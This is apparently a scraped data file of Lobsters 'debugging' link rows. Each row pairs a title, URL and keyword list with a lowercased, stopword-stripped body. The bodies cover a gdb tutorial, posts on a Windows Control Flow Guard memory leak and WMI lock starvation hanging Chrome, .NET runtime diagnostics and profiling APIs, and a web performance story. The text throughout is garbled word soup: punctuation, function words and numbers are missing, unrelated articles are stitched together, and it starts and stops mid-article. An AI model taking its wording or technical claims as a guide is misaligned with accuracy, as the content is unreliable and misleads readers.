breakpoint file helloc line gdb r starting program homebeejhello breakpoint main printf hello world n gdb next hello world return gdb next gdb next libcstartmain gdb next single stepping exit function libcstartmain line number information program exited normally gdb weird stuff end libcstartmain show another function called main function nt compiled debugging information ca nt see source still step program exit normally notice next step function call nt mean function nt get called mean next execute function done return next line current function function want step current function trace function linebyline use step command work like next except step function let say tired single stepping want program run use continue c command continue execution program running forgot set breakpoints hit ctrlc stop program wherever happens return gdb prompt point could set proper breakpoint somewhere continue breakpoint one final shortcut hitting return repeat last command entered save typing next examining variable variable wish inspect course run display variable currently scope time step code value variable displayed scope following output missing source code output line see gui mode imagine seeing highlight bar bouncing around source code running gdb b main breakpoint file helloc line gdb r starting program homebeejhello breakpoint main gdb disp gdb next gdb next gdb next gdb next gdb next gdb next gdb next gdb number left display number variable use number undisplay variable forget display number type info display get gdb b main breakpoint file helloc line gdb r starting program homebeejhello breakpoint main gdb display gdb info display autodisplay expression effect num enb expression gdb undisplay gdb want oneoff know value variable print see value gdb print gdb number mean something important beginner also handy printf command use better format output want gdb printf dn gdb printf gdb misc stuff stuff nt really fit earlier section fun enough list somewhere stack manipulation command backtrace bt show current function call stack current function top caller order beneath gdb backtrace subsubfunction subfunction main gdb type help stack info additional stepping method exit current function return calling function use finish command step single assembly instruction use stepi command continue specific location use advance command specifying location like shown breakpoints section example advance current location function subsubfunction called breakpoint main printf hello world n gdb advance subsubfunction hello world subsubfunction printf deepest n gdb advance shorthand continue temporary breakpoint jumping arbitrary section code jump command work exactly like continue except take location jump argument see breakpoints section information location need stop jump destination set breakpoint first changing variable value runtime use set variable command expression evaluate allows change value variable run also shorthand using set parenthesized expression breakpoint main int gdb print gdb set gdb print gdb set variable gdb print gdb along jump command help repeat section code without restarting program hardware watchpoints hardware watchpoints special breakpoints trigger whenever expression change often want know variable change written use watch command breakpoint main int gdb watch hardware watchpoint gdb continue continuing hardware watchpoint old value new value main gdb continue continuing hardware watchpoint old value new value main gdb note watch take expression argument put variable name something complex like even tried conditional expression like mixed result get list watch point info break info watch delete number delete command finally use rwatch detect variable read use awatch detect variable either read written attach running process program already going want stop debug first need process id pid number get unix p command use attach command pid attach break running program start gdb argument following complete run notice thing first attach running process tell function deep called nanosleepnocancel nt surprising since called sleep code indeed asking backtrace show exactly call stack say finish couple time get back main gdb gnu gdb copyright c free software foundation inc license gnu gpl version later http gnuorglicensesgplhtml free software free change redistribute warranty extent permitted law type show copying show warranty detail gdb configured gdb attach attaching process reading symbol homebeejhello done reading symbol done loaded symbol reading symbol done loaded symbol reading symbol done loaded symbol reading symbol done loaded symbol nanosleepnocancel gdb backtrace nanosleepnocancel sleep main gdb finish run till exit nanosleepnocancel sleep gdb finish run till exit sleep main sleep gdb list int sleep return gdb print gdb quit program running quit anyway detach n detaching program homebeejhello process notice get back main print value case program running second get incremented per second quit debugger detached program program return running normally mix set variable got power using coredumps postmortem analysis let say build run program dump core reason another cc g foo fooc foo segmentation fault core dumped mean core file memory snapshot time crash created name core getting core file say segmentation fault core file created might ulimit set low try typing ulimit c unlimited shell prompt fire gdb c option specify core file gdb tui c core foo tui mode greeted screen information telling program exited signal segmentation fault highlight offending line dumb terminal mode offending line printed example print variable causing problem indeed null even nt source code often useful get backtrace point program crashed window function tui mode get list existing window info win command change window focus focus f command focus take either window name prev next argument valid window name src source window cmd command window regs register window asm assembly window see next section use window note src window focus arrow key move source code cmd window focus arrow key select previous next command command history record command move src window single line single page gdb info win src line focus cmd line gdb f next focus set cmd window gdb info win src line cmd line focus gdb f src focus set src window gdb window name case insensitive winheight wh command set height particular window bad luck working well display register assembly tui mode layout command control window see additionally tui reg allows control register window open already open command layout srcstandard top command window bottom layout asmjust like src layout except assembly window top layout splitthree window source top assembly middle command bottom layout regopens register window top either source assembly whichever opened last tui reg generalshow general register tui reg floatshow floating point register tui reg systemshow system register tui reg nextshow next page important might page register nt general float system set nifty screenshot whet appetite showing source assembly split mode assembly code come two flavor intel machine intel set one appears disassembly window set disassemblyflavor valid value intel att already assembly window open close reopen layout src followed layout split example display register dumb terminal mode type info register integer register info allregisters everything writing frontend thinking wow pretty cool could write killer frontend thing worked much better gdb support call machine interface interpreter gdbmi interpreter selected gdb command line interpreter switch basically launch gdb read command result probably using pipe pretty straightforward see gdb documentation detail quick reference command parameter italic optional parameter square bracket command abbreviated become ambiguous list incomplete show thing talked tutorial help commandget help certain command apropos keywordsearch help particular keyword gdb tui c core exename unix command start gdb executable standalone specify tui start tui gui specify c corefile name see crash occurred run run currently loaded program given command line argument quitexit debugger file exenameload executable file name break locationset breakpoint location line number file eg main watch expressionbreak variable written rwatch expressionbreak variable read awatch expressionbreak variable written read info breakdisplay breakpoint watchpoint information number info watchsame info break clear locationclear breakpoint location delete numdelete breakpoint watchpoint number nextrun next line function stepstep function line possible stepistep single assembly instruction continuekeep running ctrlcstop running wherever finishrun end current function advance locationadvance location line number file eg somefunction jump locationjust like continue except jump particular location first display expressiondisplay value variable expression every step expression must make sense current scope info displayshow list expression currently displayed number undisplay numstop showing expression identified number see info display print expressionprint value variable expression printf formatstr expressionlistdo formatted output printf eg printf p sn p set variable expressionset variable value eg set variable set expression work like set variable info winshows current window info focus winnameset focus particular window bby name src cmd asm reg position next prev fsalias focus layout typeset window layout src asm split reg tui reg typeset register window layout general float system next winheight valset window height either absolute value relative value prefaced whalias winheight set disassemblyflavor flavorset lookandfeel disassembly intel machine valid flavor intel att returnhit return repeat last command backtraceshow current stack btalias backtrace attach pidattach alreadyrunning process pid info registersdump integer register screen info allregistersdump register screen copyright brian beej jorgensen hall beej beejus
281,Lobsters,debugging,Debugging,24-core CPU and I can’t type an email (part two),https://randomascii.wordpress.com/2018/08/22/24-core-cpu-and-i-cant-type-an-email-part-two/,cpu type email part two,last post control flow guard essentially unbounded cfg page additional wasted memory memorymanagement unit page table vmmap virtualscan vallocstress twitterati cfg cfg memory interpreted like related suppressed cfg call nice thing fair joe duffy article launched core duo le responsive unfair lock first suggest something like summary close call etw lldlink bug wmi window management instrumentation earlier expert chore microsoft used code update code sample setprocessvalidcalltargets like,last post promised give detail rabbit hole went investigation including page table lock wmi vmmap bug detail along updated code sample first really quick summary original issue last post talked every time cfgenabled process allocates executable memory control flow guard cfg memory allocated well window never free cfg memory keep allocating freeing executable memory different address process accumulate arbitrary amount cfg memory chrome leading essentially unbounded waste memory hang machine say hang hard avoid virtualalloc start running million time slower normal addition wasted cfg memory wasted memory although bad vmmap suggested cfg page code memory cfg memory ultimately allocated page later since kib cfg memory describe kib code memory detail later mean allocate kib block code memory kib aligned get one kib cfg page allocate kib block code memory still get kib cfg page unused thing get tricky executable memory freed virtualfree block executable memory multiple kib kib aligned o would bookkeeping see whether executable memory still using cfg page cfg author decided bother complexity always leave cfg memory allocated always unfortunate mean test program allocates free gib aligned executable memory leaf mib cfg memory allocated practically mean chrome javascript engine allocates free mib aligned executable memory committed whole address range allocated freed mib cfg memory left allocated even though trivially provable could freed since chrome repeatedly allocatingfreeing code memory randomized address causing problem discovered additional wasted memory modern operating system process get virtual memory address space operating system isolate process protect memory using memorymanagement unit mmu page table memory broken page smallest amount memory o give page need pointed eightbyte pagetable entry stored page page point different memory page need hierarchy page table address space supported operating system levelone page table cover tib bit pointing different leveltwo page table leveltwo page table cover gib pointing different levelthree page table levelthree page table cover gib pointing different levelfour page table levelfour page table cover mib pointing different physical page mmu index levelone page table first address bit pointedto leveltwo page table next address bit pointedto levelthree page table next address bit levelfour page table next address bit point mmu used bit remaining use index kib page whose address found levelfour page table phew pagetable level fully populated need gib ram sparsely populated filled needed mean allocate page memory o may need allocate page table anywhere zero three depending whether allocation previously unused mib region previously unused gib region previously unused gib region levelone page table always allocated short sparse allocation significantly expensive nearby allocation page table shared much leaking cfg allocation spread quite sparsely vmmap told chrome using kib page table edited previous blog post assumed number correct screenshot vmmap showing chromeexe memory layout last blog post page table row shown something seem right ended adding pagetable simulator virtualscan tool would count many page table page needed committed memory process scanned simply matter walking committed memory incrementing counter every time new multiple mib gib gib encountered quickly found simulator result matched vmmap normal process process large amount cfg memory result roughly amount cfg working set process vmmap said mib kib page table tool said mib scan time committed page table committed block total mib mib code block cfg mib mib able independently verify vmmap wrong running vallocstress default setting cause window commit gib cfg memory vmmap claimed also allocated gib page table yet killed process task manager showed commit amount going gib vmmap wrong quickhack pagetable calculation correct discussion helpful twitterati vmmap bug report passed along get fixed cfg memory still consumes lot page table entry mib example many vmmap said fix ship consume hardly cfg cfg memory want step back give bit information cfg cfg short control flow guard antiexploit technique used halt attack overwrite function pointer cfg enabled compiler o work together make sure branch target valid first relevant cfg control byte loaded cfg reservation process window get address space dividing branch target address let u find relevant cfg byte target cfgbyte cfgbase sizet targetaddr one byte supposed describe address range valid branch target make work cfg treat byte four twobit value one corresponding range twobit number whose value go zero three interpreted like target sixteenbyte block invalid indirect branch target start address sixteenbyte block valid indirect branch target related suppressed cfg call address potentially invalid nonaligned address sixteenbyte block valid indirect branch target however aligned address potentially invalid indirect branch target found invalid process terminated exploit avoided hurray tell indirect branch target aligned maximum security see amount cfg memory used process roughly amount code memory actual cfg code load time implementation detail many source describe cfg memory onebit per byte rather twobits per byte explanation better nice thing hang helped find memory problem happened two reason one reason scanning cfg memory window earlier painfully slow seen scan address space process take second literally time scanning cfg memory reservation even though cfg reservation three quarter committed memory block know scanning slow since fixed window care enough investigate slow scanning caused hang gmail wanted get cfg reservation wmi holding lock scanning lock memory reservation held entire length scan sample block cfg region ntqueryvirtualmemory function acquires release lock called therefore lock acquired released time held average le one m time reason even though lock released time chrome process never able acquire fair exactly problem said last time window lock design fair thread release lock try reacquire immediately case like reacquire every single time fair lock mean two thread fighting lock alternate making progress however lot context switch expensive lock might spend lot time thread inside critical region unfair lock cheaper force thread wait line grab lock joe duffy article mention joe duffy also say change unfair lock clearly risk leading starvation statistically speaking timing concurrent system tends volatile thread eventually get turn run probabilistically speaking reconcile joe statement rarity starvation experience repeatable longrunning starvation problem think main reason something else happened intel launched core duo multicore computer began become ubiquitous turn starvation problem happen multicore system multicore system wmi thread release lock signal chrome thread wake continue working wmi thread already running head start chrome thread easily reenter ntqueryvirtualmemory reacquire lock chrome chance get singlecore system obviously single thread running time window usually boost priority thread readied priority boost mean lock released chrome thread readied immediately preempt wmi thread give chrome thread lot time wake acquire lock starvation never happens see multicore system priority boost case effect wmi thread different core mean system extra core may end le responsive one workload fewer core curiously enough mean computer busier thread appropriate priority running cpu core hang might avoided try home unfair lock higher throughput lead starvation suspect solution call occasionallyfair lock would unfair say time would fair time contended lock released would give performance advantage avoiding starvation window lock used fair probably could fair maybe occasionally fair would perfect balance disclaimer locking expert o engineer interested hear thought least first suggest something like linus torvalds recently weighed importance fairness lock maybe time pendulum swing way window summary holding lock second time bad form restricts parallelism however multicore system unfair lock releasing immediately reacquiring lock behaves almost identically thread chance sneak close call etw rely etw tracing investigation bit horrified started investigation issue found window performance analyzer wpa load chrome symbol used work last week certain happened chrome shipped linked lldlink instead vc linker run dumpbin look debug information see c okay guess wpa like slash make sense signed switch lldlink know tested wpa happened version wpa shipped tested lldlink output wpa worked perfect timing new linker new wpa incompatible reverted copy wpa could continue investigation xcopy machine older version work fine filed lldlink bug team promptly fixed able upgrade back wpa ship built fixed linker wmi wmi trigger hang window management instrumentation something know little found somebody hit problem high cpu use wmiprvseexe inside perfproc getprocessvadata earlier leave enough information useful point made mistake trying figure crazy wmi query could expensive would cause gmail hang second time roped expert wasted bunch time trying find magical query recorded microsoftwindowswmiactivity etw trace experimented powershell find query went rabbit hole tedious share eventually found counter invokable single line powershell would trigger hang gmail measurecommand getwmiobject query select went even rabbit hole counter name costly really counter appears disappears based factor understand detail wmi really matter wmi anything wrong really scanning memory writing scanning code far useful chore microsoft chrome landed mitigation remaining work item microsoft speed scanning cfg region okay one done free cfg memory executable memory released least kib aligned case easy consider flag allow allocating executable memory without cfg memory use pagetargetsinvalid purpose note window internals part edition say cfg page least one bit set x need committed window implemented pagetargetsinvalid used would avoid committing memory fix vmmap calculation page table process lot cfg commit code update updated code sample especially vallocstress vallocstress includes twenty line code demonstrates find cfg reservation process also added test code us setprocessvalidcalltargets validate meaning cfg bit demonstrate trick needed call successfully hint calling getprocaddress probably hit cfg violation hacker news discussion reddit discussion like like loading related
282,Lobsters,debugging,Debugging,Monitoring and Observability in the .NET Runtime,http://www.mattwarren.org/2018/08/21/Monitoring-and-Observability-in-the-.NET-Runtime/,monitoring observability net runtime,monitoring observability net runtime introduction common language runtime clr fundamental feature secondary feature feature debuggingprofiling rest post look monitoring observability introspection feature core clr provides useful provides diagnostics diagnostic event tracing window clr provides appdomain load event fired exception thrown event gc allocation tick event perf view perfview tool perfview tutorial perfview ultimate net performance tool performance investigation common infrastructure perfview performance tracing linux lttng flamegraphs eventpipe infrastructure crossplatform performance monitoring design net crossplat performance eventing design performance monitoring project eventpipe issue future plan performance profiling controller following functionality via http server rest apis browsable html page runtimes profiling profiling api overview much much image botr page profiling api overview power feature setup hook called every time net method executed nice sample calling convention across different os cpu architecture always easy rewrite il code net method jitted setilfunctionbody api apm tool mock sealed class static method accompanying code icorprofiler api allow rejit attach rejit howto guide vminccorprofidl interface description language profiler execution engine ee ee profiler elt call stub issue linux status coreclr profiler apis profiling v debugging clr debugging v clr profiling debugging wide range different response debugging really managed debugging different nativedebugging managed debugging need abstracted il level available runtime coordinate garbage collector gc higherlevel debugging api botr managed breakpoints work icordebug api clr debugging brief introduction so icordebug partition icordebug toplevel callback process code type inspection execution control thread callstacks object inspection solution linux arm managed debugging diagnostic debugging net core linux lldb diagnostics repository wrapper included clrmd library available callback so dac botr page son strike so extension quick aside stack overflow answer so command so upcoming release new command heapstat so link so link so link shared link dac link shared link dac link party debugger memory dump creating memory dump window os cli tool analysing memory dump clr md library previously written clrheap gc root clr thread stack frame much implement so command announcement post wide range tool summary net runtime provides widerange diagnostic debugging profiling feature allow deepinsight going inside clr hackernews rprogramming rcsharp reading general etw event perfview profiling api debugging memory dump,monitoring observability net runtime aug word net managed runtime mean provides highlevel feature manage program introduction common language runtime clr written runtime many feature useful categorize follows fundamental feature feature broad impact design feature include garbage collection memory safety type safety high level support programming language secondary feature feature enabled fundamental feature may required many useful program program isolation appdomains program security sandboxing feature feature runtime environment need leverage fundamental feature clr instead result desire create complete programming environment among versioning debuggingprofiling interoperation see debuggingprofiling whilst fundamental secondary feature still make list desire create complete programming environment rest post look monitoring observability introspection feature core clr provides useful provides make easier navigate post split main section extrareading material end diagnostics firstly going look diagnostic information clr provides traditionally supplied via event tracing window etw quite wide range event clr provides related garbage collection gc justintime jit compilation module appdomains threading lock contention much example appdomain load event fired exception thrown event gc allocation tick event perf view want see etw event coming net program recommend using excellent perfview tool starting perfview tutorial excellent talk perfview ultimate net performance tool perfview widely regarded provides invaluable information instance microsoft engineer regularly use performance investigation common infrastructure however case clear name etw event available window really fit new crossplatform world net core use perfview performance tracing linux via lttng cmdline collection tool known perfcollect analysis rich ui includes flamegraphs currently window want analyse net performance linux approach link discus new eventpipe infrastructure worked net core along eventsources eventlisteners spot theme see aim crossplatform performance monitoring design highlevel provide single place clr push event related diagnostics performance event routed one logger may include etw lttng bpf example exact logger determined osplatform clr running also background information net crossplat performance eventing design explains proscons different logging technology work done event pipe tracked performance monitoring project associated eventpipe issue future plan finally also future plan performance profiling controller following goal controller responsible control profiling infrastructure exposure performance data produced net performance diagnostics component simple crossplatform way idea expose following functionality via http server pulling relevant data event pipe rest apis pri simple profiling profile runtime x amount time return trace pri advanced profiling start tracing along configuration pri advanced profiling stop tracing response calling trace pri get statistic associated eventcounters specified eventcounter browsable html page pri textual representation managed code stack process provides snapshot overview currently running use simple diagnostic report pri display current state potentially history eventcounters provides overview existing counter value open issue believe necessary public apis present enumerate eventcounters excited see performance profiling controller ppc go think really valuable net builtin clr something runtimes profiling another powerful feature clr provides profiling api mostly used party tool hook runtime lowlevel find api overview highlevel allows wire callback triggered gcrelated event happen exception thrown assembly loadedunloaded much much image botr page profiling api overview addition power feature firstly setup hook called every time net method executed whether runtime user code callback known enterleave hook nice sample show use however make work need understand calling convention across different os cpu architecture always easy also warning profiling api com component accessed via cc code use c f vbnet secondly profiler able rewrite il code net method jitted via setilfunctionbody api api hugely powerful form basis many net apm tool learn use previous post mock sealed class static method accompanying code icorprofiler api turn runtime perform sort crazy trick make profiling api work look went pr allow rejit attach info rejit see rejit howto guide overall definition profiling api interface callback found vminccorprofidl see interface description language divided logical part one profiler execution engine ee interface known asicorprofilerinfo declaration class implement icorprofilerinfo interface allow profiler communicate ee allows profiler dll get access private ee data structure thing never exported outside ee implemented following file main part ee profiler callback grouped together icorprofilercallback interface module implement wrapper around calling profiler icorprofilercallaback interface code ee need call profiler go eetoprofinterfaceimpl callback implemented across following file finally worth pointing profiler apis might work across os cpuarchs net core run eg elt call stub issue linux see status coreclr profiler apis info profiling v debugging quick aside profiling debugging overlap helpful understand different apis provide context net runtime clr debugging v clr profiling debugging debugging mean different thing different people instance asked twitter way debugged net program got wide range different response although set response contain really good list tool technique worth checking thanks lazyweb perhaps quote best sum debugging really clr provides extensive range feature related debugging need provide service excellent post managed debugging different nativedebugging provides reason native debugging abstracted hardware level managed debugging need abstracted il level managed debugging need lot information available runtime managed debugger need coordinate garbage collector gc give decent experience clr provide higherlevel debugging api known icordebug shown image common debugging scenario botr addition nice description different part interact managed breakpoints work overview pipeline component enduser debugger visual studio mdbg clr debugging service call right side implementation icordebug mscordbidll process boundary debugger debuggee clr mscorwksdll contains inprocess portion debugging service call left side communicates directly r stage debuggee code end user c program icordebug api implemented different component clr debugging brief introduction net debugging support implemented top dll call dac file usually named mscordacwksdll building block public debugging api icordebug well two private debugging apis sosdac api ixclr perfect world everyone would use icordebug public debugging api however vast majority feature needed tool developer lacking icordebug problem fixing improvement go clr vnext older version clr fact icordebug api added support crash dump debugging clr anyone debugging clr crash dump use icordebug additional writeup see so icordebug icordebug api actually split multiple interface list show category fall info see partition icordebug list came go much detail toplevel icordebug toplevel interface effectively serve collection icordebugprocess object callback managed debug event dispatched via method callback object implemented debugger process set interface represents running code includes apis related eventing code type inspection could mostly operate static pe image although convenience method live data execution control execution ability inspect thread execution practically mean thing like placing breakpoints stepping stepin stepover stepout icordebug execution control operates within managed code thread callstacks callstacks backbone debugger inspection functionality following interface related taking callstack icordebug expose debugging managed code thus stack trace managedonly object inspection object inspection part api let see value variable throughout debuggee interface list mvp method think must succinctly conveys purpose interface one note profiling apis level support debugging api varies across o cpu architecture instance aug solution linux arm managed debugging diagnostic info linux support general see great post debugging net core linux lldb checkout diagnostics repository microsoft goal making easier debug net program linux finally want see icordebug apis look like c take look wrapper included clrmd library include available callback clrmd covered depth later post so dac data access component dac discussed detail botr page essence provides outofprocess access clr data structure internal detail read another process allows debugger via icordebug son strike so extension reach running instance clr memory dump find thing like running thread object managed heap full information method including machine code current stack trace quick aside want explanation strange name bit net history lesson see stack overflow answer full list so command quite impressive using alongside windbg allows lowlevel insight going program clr see implemented let take look heapstat command give summary size different heap net gc using image so upcoming release new command heapstat code flow showing so dac work together so full heapstat command link so code heapstat command deal workstation gc link so gcheapusagestats function heavylifting link shared dacpgcheapdetails data structure contains pointer main data gc heap segment card table individual generation link dac getgcheapstaticdata function fillsout dacpgcheapdetails struct link shared dacpheapsegmentdata data structure contains detail individual segment gc heap link dac getheapsegmentdata fillsout dacpheapsegmentdata struct link party debugger microsoft published debugging api allowed party make use use icordebug interface list come across memory dump final area going look memory dump captured live system analysed offline net runtime always good support creating memory dump window net core crossplatform also tool available os one issue memory dump tricky get hold correct matching version so dac file fortunately microsoft released dotnet symbol cli tool download file needed debugging symbol module so dac coreclr module given given core dump minidump supported platform file format like elf macho window dlls pdbs portable pdbs finally spend length time analysing memory dump really take look excellent clr md library microsoft released year ago previously written nutshell allows interact memory dump via intuitive c api class provide access clrheap gc root clr thread stack frame much fact aside time needed implemented work clr md could implement so command work announcement post clrmd managed library wrapper around clr internalonly debugging apis although internalonly apis useful diagnostics support public documented release incredibly difficult use tightly coupled implementation detail clr clrmd address problem providing easytouse managed wrapper around lowlevel debugging apis making apis available officially supported library microsoft enabled developer build wide range tool top clrmd great result summary net runtime provides widerange diagnostic debugging profiling feature allow deepinsight going inside clr discus post hackernews rprogramming rcsharp reading appropriate included additional link cover topic discussed post general etw event perfview profiling api debugging memory dump
283,Lobsters,debugging,Debugging,24-core CPU and I can’t type an email (part one),https://randomascii.wordpress.com/2018/08/16/24-core-cpu-and-i-cant-type-an-email-part-one/,cpu type email part one,cpu move mouse funny uiforetw window performance analyzer exactly happened commute method wmiprvseexe fair wpa vmmap control flow guard endtoend repro rootcause mib address range service worker memory tib perprocess resolution reuses address coderange object source code rabbit hole like,looking trouble trying compile huge project background cpu move mouse engaging mundane century task writing email suddenly gmail hung kept typing several second character appearing screen suddenly gmail caught resumed important email happened time gmail went unresponsive even longer well cfg ended big part issue eight month later hit completely unrelated cfg problem written trouble resisting good performance mystery case draw particularly strong work google making chrome window focused performance investigating hang actually job lot false start hard work figured chrome gmail window department working together prevent typing email process found way save significant amount memory web page chrome investigation many rabbit hole going save digression followon post one entirely explain hang usual uiforetw running background tracing circular buffer type ctrlwinr buffer representing last thirty second system activity saved disk loaded window performance analyzer wpa definitively find hang window program stop pumping message etw event emitted indicate exactly happened type hang trivial find apparently chrome kept pumping message looked time one chrome crucial thread either went busy loop went completely idle find anything conclusive spot chrome went mostly idle even key thread kept chugging along sure hang chrome might going idle nothing uiforetw builtin key logger often useful identifying key point trace however obvious security reason default anonymizing keystroke treating every number typed every letter making hard find exact moment hang turned input tracing private full waited hang around next morning hang happened saved trace buffer put note uiforetw trace information field typing defer scuba experience gmail hung around end resumed partway experience gmail tab pid clearly normal workrelated discussion commute method important thing way locating hang etw trace loaded trace looked keyboard data generic event field event emitted uiforetw one purple diamond screen shot suddenly could see exactly hang clearly dip cpu usage correlated okay chrome stopping foreshadowing shown screenshots wmiprvseexe consuming entire cpu hyperthread whenever happened matter machine consuming one hyperthread mean machine still idle zoomed clearlysignificant period chrome idle looked particular crrenderermain chromeexe gmail tab process aside want say thank asking microsoft improve thread naming mechanism thank microsoft everything suggested thread name wpa great problem suddenly became clearer hang thread scheduled ran separate time normally running every m enough make program responsive reason making progress noticed every time woke stack simplified chromechilddll stack base kernelbasedll virtualalloc ntoskrnlexe micommitvadcfgbits ntoskrnlexe mipopulatecfgbitmap ntoskrnlexe exacquirepushlockexclusiveex ntoskrnlexe kewaitforsingleobject stack leaf chrome calling virtualalloc try update cfgbits need acquire lock first assumed chrome calling virtualalloc time seemed like weird thing reality perhaps weirder chrome called virtualalloc lock needed acquired chrome signaled lock available time row chrome woke tried acquire lock unavailable lock reacquired process released many window lock design fair thread release lock try reacquire immediately case like reacquire every single time starvation next time readying process one signaled chrome go grab lock every case wmiprvseexe releasing lock stack ntoskrnlexe kisystemservicecopyend stack base ntoskrnlexe ntqueryvirtualmemory ntoskrnlexe mmqueryvirtualmemory ntoskrnlexe miunlockanddereferencevad ntoskrnlexe exftrytowakepushlock stack leaf got distracted wmi next time eventually wrote program recreate wmi behavior cpu sampling data showed wmiprvseexe spending time edits simplification made wmiperfclassdll enumselectcounterobjects stack base wmiperfclassdll convertcounterpath pdhdll pdhitranslatecounter pdhdll getsystemperfdata kernelbasedll blahblahblah blahblahblah perfprocdll blahblahblah perfprocdll getprocessvadata ntdlldll ntqueryvirtualmemory ntoskrnlexe ntqueryvirtualmemory ntoskrnlexe mmqueryvirtualmemory ntoskrnlexe miqueryaddressspan ntoskrnlexe miqueryaddressstate ntoskrnlexe migetnextpagetable stack leaf turn reproducing slow scanning sampling data quite easy interesting part call stack ntqueryvirtualmemory used scan process memory called suggestively named getprocessvadata va probably stand virtual address virtualscan program called ntqueryvirtualmemory obvious loop scan address space specified process code worked took really long time scan gmail process second triggered hang advantage writing scanning loop could start generating statistic ntqueryvirtualmemory return data contiguous range address space matching attribute might mean reserved committed particular protection setting etc gmail process block found another process wpa turn memory block could scanned quickly point looked gmail process vmmap noticed gmail process fair amount memory kib lot separate block coming single reservation shareable category reservation size kib aka tib wot happened know tib reservation used control flow guard cfg remembered cfg showed call stack gmail chrome process waiting micommitvadcfgbits stack maybe large number block cfg region problem control flow guard cfg used try stop exploit tib reservation sparse bitmap indicates address across tib usermode address space valid indirect branch target modified virtual memory scanner count many block cfg region look tib reservation many block tagged executable since cfg memory used describe executable memory expected see one block cfg memory block executable memory process instead saw block executable memory block committed cfg memory significant discrepancy scan time committed page table committed block total mib mib code block cfg mib mib vmmap show reservation commited memory block scanning tool count committed block vmmap show block scanning tool report hindsight obvious cfg bitmap never get cleaned memory get allocated cfg bitmap allocate executable memory get freed free executable memory would explain behavior endtoend repro next step write vallocstress program allocates free thousand block executable memory random address executable need cfg enabled need hit road block really know trying worked allocating freeing many block executable memory program sit loop occasionally try allocatefree executable memory note slow basic algorithm vallocstress spin loop lot time allocate executable memory virtualalloc random address free memory spin infinite loop sleep m want cpu hog allocate executable memory virtualalloc fixed location print message virtualalloc call take m free memory super simple satisfying worked ran got virtualscan program scan vallocstress process quickly got confirmation cfg block horribly fragmented scanning took long time vallocstress program hung duration scan point simulated cfg fragmentation long scanning time hang huzzah rootcause turn chrome javascript engine coderange object managing codegen coderange object constrained mib address range small enough avoid rampant cfg allocation seeing multiple coderange object get allocated random address freed instrumented coderange constructor left gmail running found smoking gun every couple minute another coderange object created destroyed debugger made easy find workerthread start allocating object suddenly everything make sense gmail us service worker probably implementing offline mode appear disappear every minute service worker behave worker thread get temporary coderange object allocates executable page jitted javascript code random location process address space tb cfg memory reservation get entry every time new code page allocated cfg allocation never freed ntqueryvirtualmemory painfully slow scanning cfg memory m per block reason understand slow scanning cfg memory actually fixed window april update briefly wondering investigation pointless memory cfg reservation start address reservation memory actually committed executable page allocated however part cfg reservation turned committed memory using real memory page page never get freed keep allocating freeing randomly located block executable memory cfg region grow arbitrarily large well quite true cfg memory block best thought cache bounded size however little consolation bounded size tib perprocess worst seen far gmail tab running eight day accumulated mib cfg memory mib pagetables map memory total waste mib reason people see either symptom much milder symptom resolution chrome javascript engine team updated code reuses address coderange object squish bug quite nicely microsoft already fixed cfg memory scanning performance problem maybe day microsoft free cfg region executable memory freed least easy case large address range freed vmmap bug reported coworkers customer never noticed problem noticed gmail offline mode enabled running old version window department running regular wmi scan computer paying attention got lucky seems highly improbably one qualified people diagnose bug first notice factor true would experienced hang associated memory waste might never found way reason hang kept happening team ran inventory scan want trigger scan manually go control panel configuration manager action select hardware inventory cycle run source code want play along home grab sourcecode vallocstress virtualscan github rabbit hole investigation included lot rabbit hole important page table instructive lock purely waste time wmi detail talk vmmap bug followup post want gory detail ended wrong irrelevant follow whole investigation hacker news discussion reddit discussion russian translation japanese translation like like loading related
284,Lobsters,debugging,Debugging,Fairytale about performance in web application,https://itnext.io/fairytale-about-performance-in-web-application-ed2bf12627fc,fairytale performance web application,fairytale performance web application well upset well see javascript execution blocking browser rendering engine sec story begin knew something special happen processor speed slow sec web page freezing sec day deep rabbit hole looking bottleneck proof serversent event fun removed entire rendering see improvement day price made choice let justify number model good practise late got already fixed released next major version day acceptance else problem cheap solution video task solution measure day half custom tool measure performance gist complete code sec sec day w solution perfectly smooth final thought,fairytale performance web applicationonce upon time faroff land lived front end developer fortunate develop web ui powerful laptop time became completely careless performance implication code happened one day one man name nobody remembers already tried run application average price mobile phone happened truly know king land quite upset sleep decade well upset well see javascript execution blocking browser rendering engine sec story beginsit regular sunny day summer began quite hot already something different day knew something special happen old friend mine contacted next word hey man web application start kind thing year active development right release turned performance mobile kind suck app searching trip basically search list result behaves poorly may look suggest improve bad performance mobile list result big list well seen many time smooth animation scroll sometimes responsive fast expected right maybe much rerendering tweaking shouldcomponentupdate solve yeah sure glad help sound like gon na fun day got credential permission source code git clone yarn yarn start ready fun got ran application new macbook pro well animation twitching main ui element list render nothing outstanding well let processor speed slow via chrome devtools okey something erm half visual component rendering commandr wait bit go sec fully rendered ui ready use fun highlight web page freezing sec ui completely responsive reactbased web application something like item search result chrome even back day done guy day deep rabbit hole looking bottleneckwhere start well let start packagejson check quickly use main library tool alright got reactreactreduxreselect reduxsaga routerwell quite standard stack day right wait else wait sec need redux mobx well maybe legacy bad sign already moving onquick go folder entry point file let put breakpoints consolelogs get knowledge code base flow learn code style learn main feature use case data coming parsed applied ui main ui component use react dev tool inspect html element understand layout minute later know code base time run chrome profiler measure performancescripting quite heavy surprise thoughwhat get well ever ran chrome profiler messy unknown codebase scare first one scenario much information screen literally know start first see red mark time line mean real performance issue even profiler detect without analysiswhat usually quick first step check hot function bottomup list function gazzilion iteration calculating pi number digit coma spot right top list hah would easy anyway profiler result noticed mobx mobxstatetree one file project code journeysjs mentioned project tourismtraveling domain see related name first thought mobxstatetree since worked googling checked github page checked used code well library provides tooling wrap data model combine one big model tree work store object calling model method access mutate datasample repo readmethat moment first bell ringed since integrated mobx work based observables got hunch big amount model might problem moment time proof knew number model big moved onif remember next file profiler journeysjs well liked mean good feeling confidence actually touch code ie modify right see immediate feedback feel like lot control end finger opened file found line pointed profiler saw serversent event work user press search session based search parameter etc created serversent event subscription created pushing search result via eventsif think pretty wise approach imagine regular rest call take quite time process result send back client user entire application wait response back blocked stuff since data yet start responding client right away waiting entire task finished yep go event based communication solve thatwhen message event received server json data parsed object passed callback entry point processing search resultswell feel confident know exactly data coming start mocking playing around illegal fancy stuff sooner said done search get huge response copied json saved mocked communication server iti static data point important first step measurement planning compromised polluted changing data must amount data told mocked item search result instead guess hell still sucked sec still far acceptable fun almost evening moment definitely want go sleep half opened problem brain allow sleep give least reward nothing yeah got familiar codebase mocked data several hint profiler far satisfied started playing around commenting code testing hoping quick win trying localise part application affected performance yes know right data received journey service obviously trace bad everywhere 